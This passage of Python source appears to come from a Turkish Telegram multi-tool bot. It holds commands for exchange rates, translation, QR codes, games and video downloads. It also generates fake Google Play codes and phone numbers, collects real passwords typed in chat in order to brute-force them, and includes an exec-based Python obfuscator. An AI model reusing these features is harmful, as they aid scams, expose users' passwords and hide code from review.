            kod_bolumleri = [''.join(random.choice(karakterler) for _ in range(4)) for _ in range(5)]
            kod = ayirac.join(kod_bolumleri)
            olusturulan_kodlar.append(f"`{kod}`")
        yanit_mesaji = "Üretilen Google Play Kodların:\n\n" + "\n".join(olusturulan_kodlar)
        bot.send_message(chat_id=message.chat.id, text=yanit_mesaji, parse_mode='Markdown')
    else:
        bot.send_message(chat_id=message.chat.id, text="Hatalı kullanım. Lütfen /playkod [sayı] formatını kullanın.")
        
def get_exchange_rate(base, target):
    url = f"https://v6.exchangerate-api.com/v6/{EXCHANGE_API_KEY}/latest/{base}"
    response = requests.get(url)
    if response.status_code != 200:
        return None
    data = response.json()
    return data['conversion_rates'].get(target, None)

@bot.message_handler(commands=['dovizhesapla'])
@safe_execute
@check_membership
@user_is_logged_in
def doviz_hesapla(message):
    bot.reply_to(message, "Bu Komut İle Dolar Ve Euro'yu Hesaplayabilirsin.\n\nDolar'ı Hesaplamak İçin /dolar Komutunu Ver.\nEuro'yu Hesaplamak İçin /euro Komutunu Ver.")

@bot.message_handler(commands=['dolar'])
@safe_execute
@check_membership
@user_is_logged_in
def dolar(message):
    rate = get_exchange_rate('USD', 'TRY')
    if rate is None:
        bot.reply_to(message, "Bir hata oluştu. Lütfen daha sonra tekrar deneyiniz.")
        return
    try:
        amount_text = message.text.split()[1]
        amount = float(amount_text)
        total = rate * amount
        bot.reply_to(message, f"{amount} Dolar Şuanda {total:.2f} TL.")
    except (IndexError, ValueError):
        bot.reply_to(message, f"Dolar Şuanda: {rate:.2f} TL.\n\nKaç Dolar Kaç TL olduğunu görmek için /dolar yazıp yanına sayıyı ekleyin. Örneğin: /dolar 10\nBu Komut 10 Doların Kaç TL Olduğunu Gösterir")

@bot.message_handler(commands=['euro'])
@safe_execute
@check_membership
@user_is_logged_in
def euro(message):
    rate = get_exchange_rate('EUR', 'TRY')
    if rate is None:
        bot.reply_to(message, "Bir hata oluştu. Lütfen daha sonra tekrar deneyiniz.")
        return
    try:
        amount_text = message.text.split()[1]
        amount = float(amount_text)
        total = rate * amount
        bot.reply_to(message, f"{amount} Euro Şuanda {total:.2f} TL.")
    except (IndexError, ValueError):
        bot.reply_to(message, f"Euro Şuanda: {rate:.2f} TL.\n\nKaç Euro Kaç TL olduğunu görmek için /euro yazıp yanına sayıyı ekleyin. Örneğin: /euro 10\nBu Komut 10 Euronun Kaç TL Olduğunu Gösterir")    
        

 
@bot.message_handler(commands=['tool'])
@safe_execute
@check_membership
@user_is_logged_in
def yapayzeka(message):
    response = ('Dahamı Fazla Tool İstiyorsun?\nBotumuza Bakabilirsin;\n\n@TeknoDroidEvreni_bot')
    bot.reply_to(message, response)            
    
def uret_sahife_numara(sayi=1):
    numaralar = []
    baslangic = "+90"  # Türkiye için örnek başlangıç kodu
    for _ in range(sayi):
        numara = ''.join([str(random.randint(0, 9)) for _ in range(10)])  # 10 haneli rastgele numara
        tam_numara = f"`{baslangic + numara}`"  # Başına ve sonuna ` işareti eklendi
        numaralar.append(tam_numara)
    return numaralar

def mesajlari_bol_ve_gonder(chat_id, mesaj, max_uzunluk=4096):
    if len(mesaj) <= max_uzunluk:
        bot.send_message(chat_id, mesaj, parse_mode="Markdown")
    else:
        mesaj_parcalari = [mesaj[i:i+max_uzunluk] for i in range(0, len(mesaj), max_uzunluk)]
        for parca in mesaj_parcalari:
            bot.send_message(chat_id, parca, parse_mode="Markdown")

@bot.message_handler(commands=['numara_al'])
@safe_execute
@check_membership
@user_is_logged_in
def numara_al(message):
    args = message.text.split()[1:]
    if not args:
        bot.reply_to(message, "Burada Kendine Sınırsız Olarak Sahte Numara (Fake No) Alabilirsin Ancak Bu Fake No'lara Doğrulama Kodu Gelmez Sadece Numara Sende Kalır.\n\nKullanım;\nÖnce /numara_al Komutunu Gir Daha Sonra kaç Tane Numara Almak İstiyorsan O Sayıyı Gir.\nÖrneğin;\n/numara_al 3 Bu Komut İle 3 Tane Fake No Alabilirsin.")
    else:
        try:
            sayi = int(args[0])
            sahte_numaralar = uret_sahife_numara(sayi)
            numaralar_mesaji = "\n".join(sahte_numaralar)
            mesajlari_bol_ve_gonder(message.chat.id, numaralar_mesaji)  # Bu kısımda mesajı doğrudan göndermek yerine bölme işlevini kullanıyoruz.
        except ValueError:
            bot.reply_to(message, "Lütfen geçerli bir sayı girin.")
            
# Kullanıcı durumlarını takip etmek için bir sözlük.
user_states = {}

def check_user_state(message):
    return user_states.get(message.from_user.id) == 'awaiting_file'                                            
    
@bot.message_handler(commands=["ip"])
@safe_execute
@check_membership
@user_is_logged_in
def ip(message):
    response = requests.get("https://checkip.amazonaws.com")
    ip_address = response.text.strip()
    bot.reply_to(message, f"İşte Senin İP Adresin; `{ip_address}`", parse_mode='Markdown')    
    
@bot.message_handler(commands=["index"])
@safe_execute
@check_membership
@user_is_logged_in
def handle_index(m):
    msg = m.text.split()
    if len(msg) == 1:
        bot.reply_to(m, "Burada Sana Her Sitenin İndex'ini Atabilirim. Bana Sadece /index Komutundan Sonra İstediğin Sitenin İsmini Yaz.\nÖrnek Kullanım;\n\n/index https://google.com\n\n Gibi")
    else:
        fetch_and_send_index(m, msg[1])

def fetch_and_send_index(m, url):
    try:
        r = requests.get(url).content
        with open('index.html', "wb") as f:
            f.write(r)
        with open('index.html', 'rb') as file:
            bot.send_document(m.chat.id, file, caption=f"{url} Linkinin İndex'i\n\n🛡️ • BY: @Tekn0Droid")
        os.remove('index.html')
    except Exception as e:
        bot.reply_to(m, 'Hata: ' + str(e))
        
@bot.message_handler(commands=['myid'])
@safe_execute
@check_membership
@user_is_logged_in
def send_user_id(message):
    bot.reply_to(message, f"Senin ID'in: `{message.from_user.id}`", parse_mode='Markdown')        
    
istek_bilgileri = {
    'yetki': 'api.pikwy.com',
    'kabul': '*/*',
    'dil': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'izleme_engelle': '1',
    'koken': 'https://pikwy.com',
    'yollama_kaynagi': 'https://pikwy.com/',
    'tarayici_bilgisi': '"Chromium";v="105", "Not)A;Brand";v="8"',
    'mobil_mi': '?1',
    'platform': '"Android"',
    'istek_tipi': 'empty',
    'istek_modu': 'cors',
    'site_konumu': 'same-site',
    'tarayici_ua': 'Mozilla/5.0 (Linux; Android 12; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
}

@bot.message_handler(commands=['sitekontrol'])
@safe_execute
@check_membership
@user_is_logged_in
def web_sayfasi_incele(message):
    try:
        argumanlar = message.text.split()[1:]
        if not argumanlar:
            raise IndexError
        hedef_url = argumanlar[0]
        parametreler = {
            'anahtar': '125',
            'gecikme': '3000',
            'url': hedef_url,
            'tam_ekran': '0',
            'genislik': '1280',
            'yukseklik': '1200',
            'skala': '100',
            'zoom': '100',
            'format': 'jpg',
            'cevap_tipi': 'jweb',
        }
        yanit = requests.get('https://api.pikwy.com/', params=parametreler, headers=istek_bilgileri).json()
        goruntu_url = yanit['iurl']
        alinma_tarihi = yanit['date']
        alinma_bilgisi = f'Alınma Zamanı: {alinma_tarihi}'
        
        klavye = InlineKeyboardMarkup()
        dugme = InlineKeyboardButton(text=alinma_bilgisi, url=goruntu_url)
        klavye.add(dugme)
        bot.send_photo(message.chat.id, goruntu_url, reply_markup=klavye)
    except IndexError:
        bot.reply_to(message, "Burada Siteye Girmeden Önce Bot Siteye Senin Yerine Girip İçeriği SS Alır Ve Sana Atar. Örnek Kullanım:\n/sitekontrol https://site.com")
    except Exception as genel_hata:
        bot.reply_to(message, f"Bir hata oluştu: {str(genel_hata)}")    
            
@bot.message_handler(commands=['deftereyaz'])
@safe_execute
@check_membership
@user_is_logged_in
def not_defterine_yaz(mesaj):
    # Komut ile birlikte gelen argümanları almak için mesaj metnini böleriz.
    argumanlar = mesaj.text.split()[1:]  # İlk parçayı (komut) atlayıp, argümanları alırız.
    
    if not argumanlar:
        # Eğer argüman yoksa, kullanıcıya nasıl kullanılacağını söyleyen bir mesaj gönder.
        bot.reply_to(mesaj, "Kendi İsminizi Not Defterine Yazmak İsterseniz Önce /deftereyaz Komutunu Girin Ardından Ne Yazmak İstediğinizi Girin.\nÖrnek Kullanım;\n/deftereyaz TeknoDroid\nÖrneğin Bu Komut Not Defterine TeknoDroid Yazdırır")
        return  # Bu return ifadesiyle fonksiyon burada sonlanır eğer argüman yoksa.

    # Argümanlar varsa, birleştir ve bir istek URL'si oluştur.
    yazilacak_metin = ' '.join(argumanlar)
    istek_adresi = f"https://apis.xditya.me/write?text={urllib.parse.quote(yazilacak_metin)}"

    # Oluşturulan istek adresi ile fotoğrafı gönder.
    bot.send_photo(mesaj.chat.id, istek_adresi)
    
@bot.message_handler(commands=['oyun'])
@safe_execute
@check_membership
@user_is_logged_in
def send_game_options(message):
    games_message = """
🎲 /zar_at: Bir Zar At

🎯 /ok_at: Bir Ok At

🎰 /sansini_dene: Şansını Deneyebilirsin.

🎳 /bowling: Hadi Bowling Oynayalım.
"""
    bot.reply_to(message, games_message)
          
@bot.message_handler(commands=['zar_at'])
@safe_execute
@check_membership
@user_is_logged_in
def send_dice(message):
    bot.send_dice(message.chat.id, emoji='🎲')

@bot.message_handler(commands=['ok_at'])
@safe_execute
@check_membership
@user_is_logged_in
def send_darts(message):
    bot.send_dice(message.chat.id, emoji='🎯')

@bot.message_handler(commands=['sansini_dene'])
@safe_execute
@check_membership
@user_is_logged_in
def send_slot_machine(message):
    bot.send_dice(message.chat.id, emoji='🎰')

@bot.message_handler(commands=['bowling'])
@safe_execute
@check_membership
@user_is_logged_in
def send_bowling(message):
    bot.send_dice(message.chat.id, emoji='🎳')                     
    
islem_iptali = {}

def karakter_kumesi_olustur():
    rakamlar = '0123456789'
    kucuk_harfler = 'abcdefghijklmnopqrstuvwxyz'
    buyuk_harfler = kucuk_harfler.upper()
    ozel_isaretler = '!@#$%^&*()_+-=[]{}|;\':",./<>?'
    return rakamlar + kucuk_harfler + buyuk_harfler + ozel_isaretler

def sifre_testi(sifre, sohbet_id, gecici_mesaj_id):
    tum_karakterler = karakter_kumesi_olustur()
    sifre_uzunlugu = len(sifre)
    baslama_zamani = datetime.now()
    deneme_adedi = 0
    
    for uzunluk in range(1, sifre_uzunlugu + 1):
        for deneme in product(tum_karakterler, repeat=uzunluk):
            if islem_iptali.get(sohbet_id, False):
                bot.edit_message_text(chat_id=sohbet_id, message_id=gecici_mesaj_id, text="Şifre denemesi iptal edildi.")
                return
            denenen = ''.join(deneme)
            deneme_adedi += 1
            if denenen == sifre:
                bitis_zamani = datetime.now()
                gecen_sure = (bitis_zamani - baslama_zamani).total_seconds()
                
                guvenlik_seviyesi = "Zayıf" if deneme_adedi < 10000 else "Güçlü"
                tavsiye = "Daha güçlü bir şifre seçmenizi öneririm." if guvenlik_seviyesi == "Zayıf" else "Şifreniz güvenli."
                
                zxcvbn_degerlendirme = zxcvbn(sifre)
                zxcvbn_puan = round(zxcvbn_degerlendirme['score'] * 2.5, 2)
                
                sonuc_mesaji = f"Şifre Kırıldı: {denenen}\nKırma Süresi: {gecen_sure} saniye\nDeneme Sayısı: {deneme_adedi}\nŞifre Güvenliği: {guvenlik_seviyesi}. {tavsiye}\nŞifre Güvenlik Puanı (10 üzerinden): {zxcvbn_puan}"
                bot.edit_message_text(chat_id=sohbet_id, message_id=gecici_mesaj_id, text=sonuc_mesaji)
                return
    
    if not islem_iptali.get(sohbet_id, False):
        bot.edit_message_text(chat_id=sohbet_id, message_id=gecici_mesaj_id, text="Şifre kırma işlemi tamamlandı, ancak şifre bulunamadı.")

@bot.message_handler(commands=['sifrekontrol'])
@safe_execute
@check_membership
@user_is_logged_in
def sifre_kontrol(mesaj):
    mesaj_parcalari = mesaj.text.split(maxsplit=1)
    sohbet_id = mesaj.chat.id
    if len(mesaj_parcalari) < 2:
        bot.reply_to(mesaj, "Bu komut, bir şifrenin güvenliğini test eder. Kullanım: /sifrekontrol [şifreniz]")
    else:
        islem_iptali[sohbet_id] = False
        sifre = mesaj_parcalari[1]
        gecici_mesaj = bot.reply_to(mesaj, "Şifrenizin güvenliğini kontrol ediyorum, lütfen bekleyin...")
        threading.Thread(target=sifre_testi, args=(sifre, sohbet_id, gecici_mesaj.message_id)).start()

@bot.message_handler(commands=['sifreiptal'])
@safe_execute
@check_membership
@user_is_logged_in
def sifre_iptali(mesaj):
    sohbet_id = mesaj.chat.id
    islem_iptali[sohbet_id] = True

@bot.message_handler(commands=['sifreoneri'])
@safe_execute
@check_membership
@user_is_logged_in
def sifre_oneri(mesaj):
    yeni_sifre = rastgele_sifre_uret()
    bot.reply_to(mesaj, f"Önerilen yeni şifreniz: `{yeni_sifre}`", parse_mode='Markdown')

def rastgele_sifre_uret():
    ozel_isaretler = "!@#$%&*"
    tum_karakterler = string.ascii_letters + string.digits + ozel_isaretler
    yeni_sifre = ''.join(random.choice(tum_karakterler) for _ in range(12))
    return yeni_sifre          
    


def mask_link(url):
    response = requests.get(f"https://is.gd/create.php?format=simple&url={url}")
    # Yanıtı doğrudan döndürürüz, hata kontrolü yapılıyorsa burada yapılmalı
    masked_url = response.text.strip()
    return masked_url

# Kullanıcı /link_kisalt komutunu ve bir URL yazdığında bu fonksiyon çalışacak
@bot.message_handler(commands=['link_kisalt'])
@safe_execute
@check_membership
@user_is_logged_in
def url_kisalt(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "URL kısaltmak için /link_kisalt <URL> komutunu kullanın.\n"
                              "Örnek: /link_kisalt https://example.com")
        return

    kullanici_url = args[1]
    if not kullanici_url.startswith('https://') and not kullanici_url.startswith('http://'):
        bot.reply_to(message, "Lütfen URL'nizi 'http://' veya 'https://' ile başlatın.")
        return

    try:
        kisaltma_sonucu = mask_link(kullanici_url)
        bot.reply_to(message, f'Kısaltılmış Linkiniz: {kisaltma_sonucu}', disable_web_page_preview=True)
    except Exception:
        # Hata oluştuğunda kullanıcıya genel bir hata mesajı göster
        bot.reply_to(message, "Bir hata oluştu. Lütfen daha sonra tekrar deneyin.")
        
@bot.message_handler(commands=['qr'])
@safe_execute
@check_membership
@user_is_logged_in
def generate_qr(message):
    try:
        text = message.text.split(' ', 1)[1]  # Kullanıcının girdiği metni al
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(text)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white").convert('RGB')

        # Geçici dosya adı oluştur
        temp_file = f"temp_{message.chat.id}.png"
        img.save(temp_file)

        # Kaydedilen QR kodunu kullanıcıya gönder
        with open(temp_file, 'rb') as qr_file:
            bot.send_photo(message.chat.id, qr_file)

        # Dosyayı gönderdikten sonra sil
        os.remove(temp_file)
    except IndexError:
        bot.send_message(message.chat.id, 'Bu Komut QR Kod Oluşturmak İçin Kullanılır. Örnek Kullanım;\n/qr www.google.com\nBu Komut Google Sitesinin QR kodunu Verir. /qr Yaz Ve QR Kod Çıkaracağın Şeyi Girip Enterle')

def fetch_brand_logos(brand_name_input, logo_count=10):
    unique_url = "https://www.brandcrowd.com/maker/logos?text=" + brand_name_input
    response_text = requests.get(unique_url).text
    logo_image_urls = []
    for index in range(11, 23):
        logo_image = response_text.split("img src=\"")[index].split('"')[0].replace("amp;", "")
        logo_image_urls.append(logo_image)
        if len(logo_image_urls) == logo_count:
            break  # İstenen logo sayısına ulaşınca döngüden çık
    return logo_image_urls

@bot.message_handler(commands=['logo'])
@safe_execute
@check_membership
@user_is_logged_in
def handle_logo_creation(message):
    user_chat_id = message.chat.id
    try:
        message_parts = message.text.split()[1:]  # İlk komut dışındaki tüm metni alır.
        if message_parts:
            if message_parts[-1].isdigit():
                logo_count = int(message_parts.pop())  # Son eleman sayı ise, logo sayısı olarak al ve listeden çıkar
            else:
                logo_count = 10  # Varsayılan olarak 10 logo göster
            brand_name_for_logo = ' '.join(message_parts)  # Geriye kalan metni birleştir
            logos_list = fetch_brand_logos(brand_name_for_logo, logo_count)
            for single_logo_url in logos_list:
                bot.send_photo(chat_id=user_chat_id, photo=single_logo_url)
        else:
            bot.send_message(user_chat_id, 'LOGO ÜRETME;\nEğer Kendinize Ait Bir Logo Yapmak İsterseniz Şu Komutu Kullanın \n/logo TeknoDroid 3\n\n Önce /logo Komutunu Girip Sonra Logo Metninizi Yazın Daha Sonra İse Kaç Tane Logo Üretileceğini Girin.')
    except Exception as err:
        bot.send_message(user_chat_id, f'Hata: {err}')           
        
# Çeviri yapmak için kullanılan fonksiyon
def translate_specified_text(input_text, target_language):
    try:
        # Google Translate API'sini kullanarak çeviri yap
        api_response = requests.get(f'https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl={target_language}&dt=t&ie=UTF-8&oe=UTF-8&q={input_text}')
        translation_result = api_response.json()[0][0][0]  # Çeviri sonucunu al
        return translation_result
    except Exception as translation_error:
        # Bir hata oluşursa, hata mesajını döndür
        return "Çeviri sırasında bir hata oluştu: " + str(translation_error)

@bot.message_handler(commands=['ceviri'])
@safe_execute
@check_membership
@user_is_logged_in
def display_translation_commands(message):
    bot.reply_to(message,
        'Çeviri Komutları;\n'
        '/cevirin - İngilizce\n'
        '/cevires - İspanyolca\n'
        '/cevirfr - Fransızca\n'
        '/cevirde - Almanca\n'
        '/cevirzh - Çince\n'
        '/cevirja - Japonca\n'
        '/cevirru - Rusça\n'
        '/cevirpt - Portekizce\n'
        '/cevirit - İtalyanca\n'
        '/cevirar - Arapça\n'
        '/cevirko - Korece\n'
        '/cevirhi - Hintçe\n'
        '/cevirtr - Türkçe\n'
        '/cevirfa - Farsça\n'
        '/cevirpl - Lehçe\n\n'
        'Mesela Türkçe Bir Cümlenizi İngilizceye Çevirmek İstiyorsanız;\n /cevirin Selam \nyazın /cevirin Komutunu Verme Sebebimiz Çevir Kelimesinin Sonuna in Yani İngilizce Kısaltılışını Ekleyerek Cümleyi İngilizce Diline Çevirmek')

# Çeviri yapmak için kullanılan handler
@bot.message_handler(commands=['cevirin', 'cevires', 'cevirfr', 'cevirde', 'cevirzh', 'cevirja', 'cevirru', 'cevirpt', 'cevirit', 'cevirar', 'cevirko', 'cevirhi', 'cevirtr', 'cevirfa', 'cevirpl'])
@safe_execute
@check_membership
@user_is_logged_in
def handle_translation_request(message):
    message_content = message.text.split(maxsplit=1)
    if len(message_content) < 2:
        bot.reply_to(message, "Lütfen çevrilecek metni giriniz.")
        return
    translation_command = message_content[0][1:].lower()  # Komut ismini al (baştaki '/' karakterini kaldır)
    language_code = translation_command[6:]  # Komut isminin 'cevir' kısmını kaldırarak dil kodunu al
    text_for_translation = message_content[1]
    translated_message = translate_specified_text(text_for_translation, language_code)
    bot.reply_to(message, translated_message)
    
# Platforma göre dosya yolu belirleme


user_states = {}

@bot.message_handler(commands=['dosya_kisalt'])
@safe_execute
@check_membership
@user_is_logged_in
def request_file(message):
    bot.reply_to(message, "Çok Yakında Açılacak...")
    
@bot.message_handler(commands=['guzellik_olc'])
@safe_execute
@check_membership
@user_is_logged_in
def guzellik_olc(msg):
    user_states[msg.from_user.id] = 'guzellik_olc'
    bot.send_message(msg.chat.id, "Selam Dostum! Çekildiğin Bir Fotoğraf Gönder Ve Güzelliğini 100 Üzerinden Değerlendiriyim.")


user_states = {}

@bot.message_handler(func=lambda message: user_states.get(message.from_user.id) == 'guzellik_olc', content_types=['photo'])
def ph(msg):
    if msg.from_user.id == 6806205007:
        # Özel kullanıcı için ilk mesaj
        bot.send_message(msg.chat.id, "Hmm...")
        # 5 saniye bekleyip ikinci mesajı gönder
        time.sleep(5)
        bot.reply_to(msg, "Bence Botun Şimdilik En Güzel Sensin Ama Her An Daha Güzeli Gelebilir Tetikte Kal😉\n\nSana Güzelliğin İçin Verdiğim Puan ∞")
    else:
        # Diğer tüm kullanıcılar için işlem
        bot.send_message(msg.chat.id, "Birazcık Beklede Şu Güzelliği Hemen Bi Değerlendireyim ;)")
        time.sleep(5)
        tz = list(range(1, 101))  # 1'den 100'e kadar olan tüm sayılar
        tzz = random.choice(tz)
        bot.reply_to(msg, f"Bence Senin Güzelliğin 100 Üzerinden {tzz}.")
    user_states[msg.from_user.id] = None



kullanici_secenekleri = {}

@bot.message_handler(commands=['pysifrele'])
@safe_execute
@check_membership
@user_is_logged_in
def function_1(mesaj):
    secenekler_mesaji = ("1. Encode Marshal\\n2. Encode Zlib\\n3. Encode Base16\\n4. Encode Base32\\n5. Encode Base64\\n6. Encode Zlib,Base16\\n7. Encode Zlib,Base32\\n8. Encode Zlib,Base64\\n9. Encode Marshal,Zlib\\n10. Encode Marshal,Base16\\n11. Encode Marshal,Base32\\n12. Encode Marshal,Base64\\n13. Encode Marshal,Zlib,B16\\n14. Encode Marshal,Zlib,B32\\n15. Encode Marshal,Zlib,B64\\nLütfen bir seçenek numarası giriniz:")
    mesaj_cvp = bot.reply_to(mesaj, secenekler_mesaji)
    bot.register_next_step_handler(mesaj_cvp, function_2)

def function_2(mesaj):
    try:
        secim = int(mesaj.text)
    except ValueError:
        bot.reply_to(mesaj, "Lütfen bir sayı girin.")
        return
    kullanici_secenekleri[mesaj.from_user.id] = secim
    bot.reply_to(mesaj, "Lütfen şifrelenecek dosyayı gönderin.")

@bot.message_handler(content_types=['document'])
def function_3(mesaj):
    try:
        secim = kullanici_secenekleri[mesaj.from_user.id]
    except KeyError:
        bot.reply_to(mesaj, "Lütfen önce bir şifreleme yöntemi seçin, `/pysifrele` komutunu kullanın.")
        return
    
    dosya_bilgisi = bot.get_file(mesaj.document.file_id)
    indirilen_dosya = bot.download_file(dosya_bilgisi.file_path)
    
    with tempfile.NamedTemporaryFile(delete=False) as gecici_dosya:
        gecici_dosya.write(indirilen_dosya)
        gecici_dosya_yolu = gecici_dosya.name
    
    with open(gecici_dosya_yolu, "rb") as f:
        veri = f.read()
    
    orijinal_dosya_adi = mesaj.document.file_name
    cikti_dosya_adi = orijinal_dosya_adi.replace(".py", " - sifreli.py") if orijinal_dosya_adi.endswith(".py") else orijinal_dosya_adi + " - sifreli"
    cikti_yolu = cikti_dosya_adi  
    
    py_sifreletiyici(secim, veri, cikti_yolu)
    
    with open(cikti_yolu, "rb") as sifrelenmis_dosya:
        bot.send_document(mesaj.chat.id, sifrelenmis_dosya, caption="İşte Son Kalitede Şifrelenen Dosyan Dostum İnan Bana Bunu Hiç Kimse Çözemez 😉")
    
    os.unlink(gecici_dosya_yolu)
    os.unlink(cikti_yolu)

def py_sifreletiyici(secenek, veri, cikti):
    sifreleyen_bilgi = "#SIFRELEYEN: t.me/CVARB_AI_bot\\n".encode('utf-8')
    if secenek == 1:
        sifreli_veri = dumps(veri)[::-1]
        baslik = sifreleyen_bilgi + b"_ = lambda __ : __import__('marshal').loads(__[::-1]);"
    elif secenek == 2:
        sifreli_veri = compress(veri.encode('utf-8'))[::-1]
        baslik = sifreleyen_bilgi + b"_ = lambda __ : __import__('zlib').decompress(__[::-1]);"
    elif secenek == 3:
        sifreli_veri = b16encode(veri.encode('utf-8'))[::-1]
        baslik = sifreleyen_bilgi + b"_ = lambda __ : __import__('base64').b16decode(__[::-1]);"
    elif secenek == 4:
        sifreli_veri = b32encode(veri.encode('utf-8'))[::-1]
        baslik = sifreleyen_bilgi + b"_ = lambda __ : __import__('base64').b32decode(__[::-1]);"
    elif secenek == 5:
        sifreli_veri = b64encode(veri.encode('utf-8'))[::-1]
        baslik = sifreleyen_bilgi + b"_ = lambda __ : __import__('base64').b64decode(__[::-1]);"
    elif secenek == 6:
        sifreli_veri = b16encode(compress(veri.encode('utf-8')))[::-1]
        baslik = sifreleyen_bilgi + b"_ = lambda __ : __import__('zlib').decompress(__import__('base64').b16decode(__[::-1]));"
    elif secenek == 7:
        sifreli_veri = b32encode(compress(veri.encode('utf-8')))[::-1]
        baslik = sifreleyen_bilgi + b"_ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[::-1]));"
    elif secenek == 8:
        sifreli_veri = b64encode(compress(veri.encode('utf-8')))[::-1]
        baslik = sifreleyen_bilgi + b"_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));"
    elif secenek == 9:
        sifreli_veri = compress(dumps(veri))[::-1]
        baslik = sifreleyen_bilgi + b"_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__[::-1]));"
    elif secenek == 10:
        sifreli_veri = b16encode(dumps(veri))[::-1]
        baslik = sifreleyen_bilgi + b"_ = lambda __ : __import__('marshal').loads(__import__('base64').b16decode(__[::-1]));"
    elif secenek == 11:
        sifreli_veri = b32encode(dumps(veri))[::-1]
        baslik = sifreleyen_bilgi + b"_ = lambda __ : __import__('marshal').loads(__import__('base64').b32decode(__[::-1]));"
    elif secenek == 12:
        sifreli_veri = b64encode(dumps(veri))[::-1]
        baslik = sifreleyen_bilgi + b"_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));"
    elif secenek == 13:
        sifreli_veri = b16encode(compress(dumps(veri)))[::-1]
        baslik = sifreleyen_bilgi + b"_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b16decode(__[::-1])));"
    elif secenek == 14:
        sifreli_veri = b32encode(compress(dumps(veri)))[::-1]
        baslik = sifreleyen_bilgi + b"_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b32decode(__[::-1])));"
    elif secenek == 15:
        sifreli_veri = b64encode(compress(dumps(veri)))[::-1]
        baslik = sifreleyen_bilgi + b"_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));"
    
    # Veriyi ve başlığı dosyaya yazma işlemi
    with open(cikti, 'wb') as dosya:
        dosya.write(baslik + b"\\nexec(_(b'" + sifreli_veri + b"'))")




@bot.message_handler(commands=['goruntu_olustur_ai'])
@safe_execute
@check_membership
@user_is_logged_in
@user_is_premium
def image_generate(message):
    # Kullanıcının gönderdiği metni ayıklama
    try:
        _, query = message.text.split(' ', 1)
    except ValueError:
        # Kullanıcı yeterli bilgi sağlamazsa hata mesajı gönder
        bot.reply_to(message, "Lütfen komutla birlikte bir anahtar kelime giriniz. Örneğin: /goruntu_olustur_ai kedi")
        return

    # Gelen metni İngilizce'ye çevirme
    translated_text = translate_to_english(query)

    if translated_text is None:
        bot.reply_to(message, "Metin çevirisi yapılamadı, lütfen tekrar deneyin.")
        return

    # Unsplash üzerinden görüntü URL'si oluşturma
    url = f'https://source.unsplash.com/featured/?{translated_text}'

    # Görüntüyü indirme ve Telegram üzerinden gönderme
    response = requests.get(url)
    if response.status_code == 200:
        # BytesIO ile indirilen görüntüyü Telegram'a yüklemek için bir dosya gibi kullan
        img = BytesIO(response.content)
        img.name = 'image.jpg'
        bot.send_photo(message.chat.id, photo=img)
    else:
        bot.reply_to(message, "Görüntü yüklenirken bir hata oluştu, lütfen daha sonra tekrar deneyin.")


        
@bot.message_handler(commands=['yt_video_indir'])
@safe_execute
@check_membership
@user_is_logged_in
def youtube_video_indirici(mesaj: Message):
    argumanlar = mesaj.text.split(maxsplit=1)
    if len(argumanlar) == 1:
        bot.reply_to(mesaj, "Bu Komut İle YouTube'dan Video İndirebilirsin. Örnek Kullanım\n/ytvideoindir [YouTube Video Linki]")
        return

    video_linki = argumanlar[1]
    bekleme_mesaji = bot.send_message(mesaj.chat.id, "Video biraz sonra gelir, lütfen video gelene kadar herhangi bir komut girme.")

    indirme_ayarlari = {
        'format': 'best',
        'outtmpl': '/tmp/%(id)s.%(ext)s',
        'quiet': True,
        'no_warnings': True,
    }

    with yt_dlp.YoutubeDL(indirme_ayarlari) as ydl:
        try:
            video_bilgileri = ydl.extract_info(video_linki, download=False)
            gercek_video_url = video_bilgileri.get('url', None)
            video_basligi = video_bilgileri.get('title', None)
            
            if gercek_video_url:
                # Videoyu geçici bir dosyaya indir
                with NamedTemporaryFile(suffix='.mp4', delete=False) as gecici_dosya:
                    istek = requests.get(gercek_video_url, stream=True)
                    for parca in istek.iter_content(chunk_size=8192):
                        gecici_dosya.write(parca)

                    gecici_dosya.seek(0)

                    # Geçici dosyayı Telegram'a yükleyin
                    with open(gecici_dosya.name, 'rb') as video:
                        bot.send_video(mesaj.chat.id, video, timeout=1000)
                        # Bekleme mesajını sil
                        bot.delete_message(chat_id=mesaj.chat.id, message_id=bekleme_mesaji.message_id)
        except Exception as hata:
            bot.reply_to(mesaj, f"Video indirilirken bir hata oluştu: {str(hata)}")
            # Hata durumunda bekleme mesajını sil
            bot.delete_message(chat_id=mesaj.chat.id, message_id=bekleme_mesaji.message_id)
            
# Facebook video indirici
@bot.message_handler(commands=['fb_video_indir'])
@safe_execute
@check_membership
@user_is_logged_in
def facebook_video_indirici(mesaj: Message):
    argumanlar = mesaj.text.split(maxsplit=1)
    if len(argumanlar) == 1:
        bot.reply_to(mesaj, "Bu Komut İle Facebook'tan Video İndirebilirsin. Örnek Kullanım\n/fbvideoindir [Facebook Video Linki]")
        return

    video_linki = argumanlar[1]
    bekleme_mesaji = bot.send_message(mesaj.chat.id, "Video biraz sonra gelir, lütfen video gelene kadar herhangi bir komut girme.")

    indirme_ayarlari = {
        'format': 'best',
        'outtmpl': '/tmp/%(id)s.%(ext)s',
        'quiet': True,
        'no_warnings': True,
    }

    with yt_dlp.YoutubeDL(indirme_ayarlari) as ydl:
        try:
            video_bilgileri = ydl.extract_info(video_linki, download=False)
            gercek_video_url = video_bilgileri.get('url', None)
            video_basligi = video_bilgileri.get('title', None)
            
            if gercek_video_url:
                # Videoyu geçici bir dosyaya indir
                with NamedTemporaryFile(suffix='.mp4', delete=False) as gecici_dosya:
                    istek = requests.get(gercek_video_url, stream=True)
                    for parca in istek.iter_content(chunk_size=8192):
                        gecici_dosya.write(parca)

